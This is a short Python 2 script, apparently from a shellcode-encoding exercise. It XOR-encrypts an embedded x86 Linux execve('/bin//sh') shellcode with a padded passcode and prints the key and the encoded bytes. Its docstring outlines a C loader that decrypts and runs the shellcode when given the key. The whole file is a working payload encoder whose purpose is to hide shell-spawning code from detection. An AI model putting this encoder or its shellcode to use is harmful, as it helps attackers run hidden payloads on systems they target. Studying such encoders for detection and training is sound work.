"""
The concept of genkey
1. Add the original shellcode to the script
2. Add any random passcode , but keep it shorter or equal to the length of the shellcode
3. Fixed character will be added to passcode if the length is lesser than size of shellcode
4. Copy the shellcode to an array
5. Copy the key to an array
6. Copy the shellcode to another array, called cipher( we will overwrite this array)
7. For each element in shellcode XOR for each element in key , and store them in the cipher array
8. prints the xorkey
9. prints the encrypted shellcode
10. Copy the shellcode and put in in one C file to execute the shellcode
11. Implement the logic inside the code to take argument of key from commandline
12. Repace each shellcode content with ( for each element of encrypted shellcode XOR for each element of key )
13. Compile and run and pass the passcode during executiton of the program
"""

import sys
import array
import binascii
shellcode = "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\x31\xc0\xb0\x0b\xcd\x80"
size = len(shellcode)
passcode = "ABCD"
padding_char = "+"
xorkey = passcode
while len(shellcode) != len(xorkey):
	xorkey=xorkey+padding_char

plaintext = array.array('B',shellcode)
key = array.array('B',xorkey)
cipher = array.array('B',shellcode)#Just filling ( will be overwritten )
for i in range(len(plaintext)):
	cipher[i]=plaintext[i]^key[i]

#print "Shellcode    : "+shellcode +" Size: "+ str(len(shellcode))
print "Generated Key: "+xorkey
#print "Encrypted    : "+cipher.tostring()+ " Size"+str(len(cipher))
temp=""
for i in cipher:
	hex_code = str(hex(int(i)))
	if len(hex_code) < 4:
		hex_code="0"+hex_code #hack to convert \x4 to \x04
	temp=temp+"\\x"+hex_code
print "Encrypted shellcode=====\n"
print temp.replace('0x','') #hack to covert 0xAA to AA format

#encrypted_shellcode = cipher.tolist()

